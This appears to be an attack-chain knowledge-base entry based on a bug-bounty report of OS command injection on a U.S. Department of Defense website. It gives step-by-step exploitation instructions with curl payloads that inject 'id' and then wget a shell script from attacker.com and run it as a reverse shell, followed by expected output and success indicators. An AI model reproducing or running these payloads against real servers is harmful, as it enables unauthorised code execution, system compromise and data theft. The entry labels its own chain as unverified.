---
id: ac-dod-rce-710864
tags:
  - rce
  - command-injection
  - dod
  - web
  - hackerone
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-OS-Command-Injection-for-RCE]]'
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:24:07.925Z'
description: >-
  A critical OS Command Injection vulnerability in a U.S. Department of Defense
  website allowed remote attackers to execute arbitrary operating system
  commands, resulting in full server compromise.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# OS Command Injection Leading to Remote Code Execution on DoD Website

Multi-stage attack chain demonstrating exploitation of an OS Command Injection vulnerability in a U.S. Department of Defense website, leading to remote code execution and potential full system compromise.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via Web Input] --> B[Command Injection and Execution]
    B --> C[System Compromise]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser or proxy tool like Burp Suite for payload testing

### Target Environment

- Web application on a server (likely Linux/Unix-based given OS commands)
- Vulnerable input field (e.g., search, parameter, or form) that executes system commands without sanitization
- Network access to the public-facing DoD website

### Initial Access Requirements

- No credentials required (public-facing application)
- Direct HTTP/HTTPS access to the website
- No prior access needed beyond internet connectivity

## Detailed Attack Procedures

### Step 1: Exploit Command Injection
procedure: [[procedures/Exploit-OS-Command-Injection-for-RCE]]

**Objective**: Identify and exploit an unsanitized input field to inject OS commands, achieving remote code execution on the server.

**Instructions**: Access the DoD website and locate a user-controlled input (e.g., a search parameter or file upload field). Test for injection by appending command separators like ';', '|', or '&&'. Use a payload to execute a benign command like 'id' to confirm execution. Escalate to more impactful commands if successful.

First, test basic injection using a browser or [[commands/curl-command-injection-test]]:

```bash
curl "https://target-dod-site.gov/search?q=normal" -v
```

Then inject a payload:

```bash
curl "https://target-dod-site.gov/search?q=test; id" -v
```

If successful, escalate with [[commands/curl-rce-payload]] to download and execute a reverse shell:

```bash
curl "https://target-dod-site.gov/search?q=test; wget http://attacker.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh" -v
```

**Expected Output**: Server response includes output from injected command (e.g., 'uid=33(www-data) gid=33(www-data)' for 'id'), or evidence of shell execution like a connection back to attacker.

**Success Indicators**:
- Unexpected command output in response (e.g., user/group info from 'id')
- File creation or network activity from escalated payload
- Reverse shell connection established

## Attack Chain Summary

### Key Achievements

1. Bypassed input sanitization to inject OS commands
2. Achieved remote code execution on the DoD server
3. Enabled potential full system compromise and data exfiltration

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
